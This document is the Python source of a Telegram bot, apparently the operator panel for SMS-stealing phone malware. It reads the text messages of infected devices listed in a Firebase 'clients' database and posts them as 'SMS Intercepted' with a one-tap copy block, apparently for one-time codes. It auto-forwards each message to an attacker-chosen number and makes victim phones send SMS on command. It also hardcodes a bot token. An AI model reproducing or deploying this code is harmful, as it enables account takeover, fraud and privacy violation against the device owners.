import telebot
import requests
import re
import os
import threading
import time


app = Flask('')

@app.route('/')
def home():
    return "Bot is running 24/7!"

def run_web():
    # Render default port 10000 use karega
    app.run(host='0.0.0.0', port=10000)


# ================= CONFIGURATION =================
BOT_TOKEN = '8258467399:AAE8QarqBDU6VX5y25EdKZgZUreV-VKluvM'
CONFIG_FILE = 'bot_config.txt'
# =================================================

bot = telebot.TeleBot(BOT_TOKEN)

bot_config = {
    "firebase_url": None,
    "channel_id": None,
    "selected_device": None,
    "forward_number": None,
    "admin_chat_id": None,
    "is_monitoring": False
}

# ---------- Local config persistence ----------
def save_local_config():
    with open(CONFIG_FILE, 'w') as f:
        f.write(f"FIREBASE_URL={bot_config['firebase_url'] or ''}\n")
        f.write(f"CHANNEL_ID={bot_config['channel_id'] or ''}\n")
        f.write(f"SELECTED_DEVICE={bot_config['selected_device'] or ''}\n")
        f.write(f"FORWARD_NUMBER={bot_config['forward_number'] or ''}\n")
        f.write(f"ADMIN_CHAT_ID={bot_config['admin_chat_id'] or ''}\n")

def load_local_config():
    if not os.path.exists(CONFIG_FILE):
        return
    with open(CONFIG_FILE, 'r') as f:
        for line in f.readlines():
            if "=" not in line:
                continue
            key, val = line.split("=", 1)
            val = val.strip()
            if key == "FIREBASE_URL":
                bot_config["firebase_url"] = val or None
            elif key == "CHANNEL_ID":
                bot_config["channel_id"] = int(val) if val else None
            elif key == "SELECTED_DEVICE":
                bot_config["selected_device"] = val or None
            elif key == "FORWARD_NUMBER":
                bot_config["forward_number"] = val or None
            elif key == "ADMIN_CHAT_ID":
                bot_config["admin_chat_id"] = int(val) if val else None
    print("💾 Settings restored:", bot_config)

load_local_config()

# ---------- Firebase helpers ----------
def firebase_get(path):
    if not bot_config["firebase_url"]:
        return None
    try:
        url = f"{bot_config['firebase_url']}{path}.json"
        r = requests.get(url, timeout=10)
        return r.json() if r.status_code == 200 else None
    except Exception as e:
        print(f"❌ GET error [{path}]: {e}")
        return None

def firebase_patch(path, data):
    if not bot_config["firebase_url"]:
        return False
    try:
        r = requests.patch(f"{bot_config['firebase_url']}{path}.json", json=data, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"❌ PATCH error: {e}")
        return False

# ---------- Commands ----------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot_config["admin_chat_id"] = message.chat.id
    save_local_config()
    welcome = (
        f"📊 **Bot Status:**\n"
        f"🔗 Firebase: `{'Connected' if bot_config['firebase_url'] else 'Not Set'}`\n"
        f"📢 Channel ID: `{bot_config['channel_id'] or 'Not Set'}`\n"
        f"📱 Selected Device: `{bot_config['selected_device'] or 'Not Set'}`\n"
        f"📞 Forward Number: `{bot_config['forward_number'] or 'Not Set'}`\n"
        f"🔍 Monitor: `{'🟢 ACTIVE' if bot_config['is_monitoring'] else '🔴 INACTIVE'}`\n\n"
        f"**Commands:**\n"
        f"/setfirebase - Set Firebase URL\n"
        f"/setchannel - Link Channel ID\n"
        f"/setdevice - Select Device\n"
        f"/setforwardnumber - Set forward number\n"
        f"/monitor - Start/Stop live SMS tracker"
    )
    bot.reply_to(message, welcome, parse_mode="Markdown")

@bot.message_handler(commands=['setfirebase'])
def set_firebase(message):
    msg = bot.reply_to(message, "🔗 Firebase Realtime Database URL bhejein:")
    bot.register_next_step_handler(msg, save_fb)

def save_fb(message):
    url = message.text.strip()
    if not url.endswith("/"):
        url += "/"
    bot_config["firebase_url"] = url
    save_local_config()
    bot.reply_to(message, "✅ Firebase URL saved!")

@bot.message_handler(commands=['setchannel'])
def set_channel(message):
    msg = bot.reply_to(message, "📢 Channel ID enter karein (e.g. -100xxx):")
    bot.register_next_step_handler(msg, save_ch)

def save_ch(message):
    try:
        bot_config["channel_id"] = int(message.text.strip())
        save_local_config()
        bot.reply_to(message, "✅ Channel linked!")
    except:
        bot.reply_to(message, "❌ Invalid ID format.")

@bot.message_handler(commands=['setforwardnumber'])
def set_forward_number(message):
    msg = bot.reply_to(message, "📞 Target forward number enter karein:")
    bot.register_next_step_handler(msg, save_fwd_num)

def save_fwd_num(message):
    num = message.text.strip().replace(" ", "")
    bot_config["forward_number"] = num
    save_local_config()
    bot.reply_to(message, f"✅ Forward number saved: `{num}`", parse_mode="Markdown")

@bot.message_handler(commands=['setdevice'])
def set_device(message):
    clients = firebase_get("clients")
    if not clients or not isinstance(clients, dict):
        bot.reply_to(message, "❌ /clients node empty ya URL galat.")
        return
    markup = telebot.types.InlineKeyboardMarkup()
    for key, value in clients.items():
        if not isinstance(value, dict):
            continue
        phone = value.get('phoneNumber', 'Unknown')
        markup.add(telebot.types.InlineKeyboardButton(
            text=f"📱 {key[:8]}... ({phone})",
            callback_data=f"seldev_{key}"
        ))
    if not markup.keyboard:
        bot.reply_to(message, "❌ Koi device nahi mila.")
        return
    bot.send_message(message.chat.id, "🔌 Target device select karein:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('seldev_'))
def callback_device(call):
    dev_id = call.data.split('_', 1)[1]
    bot_config["selected_device"] = dev_id
    save_local_config()
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"✅ Device selected: `{dev_id}`",
        parse_mode="Markdown"
    )

# ---------- LIVE MONITOR ----------
processed_received_keys = set()
last_sent_signature = {}   
devices_with_baseline = set() 

def format_phone_display(num):
    if not num:
        return "Unknown"
    n = str(num).strip().replace(" ", "").replace("-", "")
    if n.startswith("+"):
        return n
    if len(n) == 10 and n.isdigit():
        return "+91" + n
    if n.startswith("91") and len(n) == 12:
        return "+" + n
    return n

def send_to_admin(text):
    if bot_config["admin_chat_id"]:
        try:
            bot.send_message(bot_config["admin_chat_id"], text, parse_mode="Markdown")
        except Exception as e:
            print(f"⚠️ Admin send fail: {e}")

def send_to_channel(to_number, message_body):
    if not bot_config["channel_id"]:
        return
    
    formatted_phone = format_phone_display(to_number)
    
    # NEW REQ: Perfect requested visual format with One-tap copy block
    text = (
        f"📱 SMS Intercepted\n"
        f"━━━━━━━━━━━━━━\n"
        f"📞 To: {formatted_phone}\n"
        f"💬 Message: {message_body}\n\n"
        f"📋 One-tap copy:\n"
        f"`{formatted_phone} | {message_body}`"
    )
    try:
        bot.send_message(bot_config["channel_id"], text, parse_mode="Markdown")
    except Exception as e:
        print(f"⚠️ Channel send fail: {e}")

# --- Received SMS scanner ---
def scan_received_sms(dev_id):
    node = firebase_get(f"messages/{dev_id}")
    if not isinstance(node, dict):
        return

    items = list(node.items())

    if dev_id not in devices_with_baseline:
        for key, _ in items:
            processed_received_keys.add(f"{dev_id}_{key}")
        devices_with_baseline.add(dev_id)
        print(f"✅ Baseline set for device {dev_id[:8]}... Ignored existing keys.")
        return

    def sort_key(kv):
        v = kv[1] if isinstance(kv[1], dict) else {}
        return v.get("dateTime") or v.get("timestamp") or ""
    try:
        items.sort(key=sort_key)
    except Exception:
        pass

    for key, sms in items:
        if not isinstance(sms, dict):
            continue
        uid = f"{dev_id}_{key}"
        if uid in processed_received_keys:
            continue
        processed_received_keys.add(uid)

        sender = sms.get("sender") or sms.get("from") or sms.get("address") or "Unknown"
        body = sms.get("message") or sms.get("body") or sms.get("text") or ""
        dt = sms.get("dateTime") or sms.get("timestamp") or ""

        # 1. Admin Alert log
        admin_text = (
            f"📥 **New SMS Received!**\n"
            f"📱 Device: `{dev_id[:8]}...`\n"
            f"👤 From: `{sender}`\n"
            f"🕒 Time: `{dt}`\n"
            f"💬 Message:\n`{body}`"
        )
        send_to_admin(admin_text)

        # 2. Channel Stream Update with new format
        device_phone = None
        client_data = firebase_get(f"clients/{dev_id}")
        if isinstance(client_data, dict):
            device_phone = client_data.get("phoneNumber")

        send_to_channel(device_phone or dev_id, body)

        # 3. AUTO-FORWARD TO REGISTERED TARGET NUMBER
        if bot_config["forward_number"]:
            fwd_target = bot_config["forward_number"]
            
            fwd_payload = {
                "action": {
                    "command": "send message",
                    "messageText": body,
                    "phoneNumber": fwd_target,
                    "sendSms": {"message": body, "status": "pending", "to": fwd_target},
                    "simSlot": "0",
                    "targetDeviceId": dev_id
                },
                "webhookEvent": {
                    "sendSms": {"message": body, "isSended": False, "to": fwd_target}
                }
            }
            
            fwd_success = firebase_patch(f"clients/{dev_id}", fwd_payload)
            if fwd_success and bot_config["admin_chat_id"]:
                try:
                    bot.send_message(
                        bot_config["admin_chat_id"],
                        f"⚡ **Auto-Forwarded:** SMS pushed to `{fwd_target}` successfully.",
                        parse_mode="Markdown"
                    )
                except:
                    pass

    if len(processed_received_keys) > 3000:
        processed_received_keys.clear()
        devices_with_baseline.remove(dev_id)

# --- Sent SMS scanner ---
def scan_sent_sms(dev_id):
    node = firebase_get(f"clients/{dev_id}/webhookEvent/sendSms")
    if not isinstance(node, dict):
        return

    msg = node.get("message", "")
    to = node.get("to", "")
    is_sent = bool(node.get("isSended", False))
    signature = f"{msg}|{to}|{is_sent}"

    if dev_id not in last_sent_signature:
        last_sent_signature[dev_id] = signature
        return

    prev = last_sent_signature.get(dev_id, "")
    if signature == prev:
        return

    prev_parts = prev.split("|") if prev else ["", "", "False"]
    prev_msg = prev_parts[0]
    prev_is_sent = prev_parts[2] == "True"

    just_delivered = (not prev_is_sent and is_sent)
    new_delivered_msg = (msg != prev_msg and is_sent)

    last_sent_signature[dev_id] = signature

    if just_delivered or new_delivered_msg:
        admin_text = (
            f"✅ **SMS Sent Successfully!**\n"
            f"📱 Device: `{dev_id[:8]}...`\n"
            f"👤 To: `{format_phone_display(to)}`\n"
            f"💬 Message:\n`{msg}`"
        )
        send_to_admin(admin_text)
        
        if bot_config["channel_id"]:
            try:
                bot.send_message(bot_config["channel_id"], f"📤 Sent To: {format_phone_display(to)}\n💬 Message: {msg}")
            except:
                pass

# --- Main monitoring loop ---
def sms_monitoring_loop():
    print("🟢 Live SMS monitoring engine started.")
    while True:
        try:
            if bot_config["is_monitoring"] and bot_config["firebase_url"]:
                if bot_config["selected_device"]:
                    targets = [bot_config["selected_device"]]
                else:
                    clients = firebase_get("clients")
                    targets = list(clients.keys()) if isinstance(clients, dict) else []

                for dev_id in targets:
                    scan_received_sms(dev_id)
                    scan_sent_sms(dev_id)

        except Exception as ex:
            print(f"⚠️ Monitor loop error: {ex}")

        time.sleep(3)

@bot.message_handler(commands=['monitor'])
def toggle_monitoring(message):
    if not bot_config["firebase_url"]:
        bot.reply_to(message, "⚠️ Pehle `/setfirebase` set karein!")
        return

    bot_config["is_monitoring"] = not bot_config["is_monitoring"]
    bot_config["admin_chat_id"] = message.chat.id

    if bot_config["is_monitoring"]:
        processed_received_keys.clear()
        last_sent_signature.clear()
        devices_with_baseline.clear() 

    save_local_config()
    status_str = "🟢 ACTIVE" if bot_config["is_monitoring"] else "🔴 INACTIVE"
    bot.reply_to(message, f"Live tracking: **{status_str}**", parse_mode="Markdown")

# ---------- Channel command → Firebase format ----------
@bot.channel_post_handler(func=lambda message: True)
def process_channel_command(message):
    if not bot_config["channel_id"] or message.chat.id != bot_config["channel_id"]:
        return
    text = message.text or ""
    if not text:
        return

    if "📱 SMS TOKEN" not in text:
        return

    phone_match = re.search(r"📞\s*To:\s*(\+?\d+)", text)
    msg_match = re.search(r"💬\s*Message:\s*(.*)", text, re.DOTALL)

    if not (phone_match and msg_match):
        return

    target_phone = phone_match.group(1).strip()
    sms_text = msg_match.group(1).strip()

    if not bot_config["selected_device"]:
        return
        
    dev_id = bot_config["selected_device"]

    payload = {
        "action": {
            "command": "send message",
            "messageText": sms_text,
            "phoneNumber": target_phone,
            "sendSms": {"message": sms_text, "status": "pending", "to": target_phone},
            "simSlot": "0",
            "targetDeviceId": dev_id
        },
        "webhookEvent": {
            "sendSms": {"message": sms_text, "isSended": False, "to": target_phone}
        }
    }

    success = firebase_patch(f"clients/{dev_id}", payload)
    if success and bot_config["admin_chat_id"]:
        try:
            bot.send_message(
                bot_config["admin_chat_id"],
                f"⚡ Task pushed to `{dev_id[:8]}...` → `{target_phone}`",
                parse_mode="Markdown"
            )
        except:
            pass

# ---------- Startup ----------
if __name__ == "__main__":
    monitor_thread = threading.Thread(target=sms_monitoring_loop, daemon=True)
    monitor_thread.start()

    print("\n🚀 Starting Telegram Bot...")
    try:
        me = bot.get_me()
        print(f"✅ Connected as @{me.username}")
        print("🟢 Bot online. Monitor running.\n")
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Bot crashed: {e}")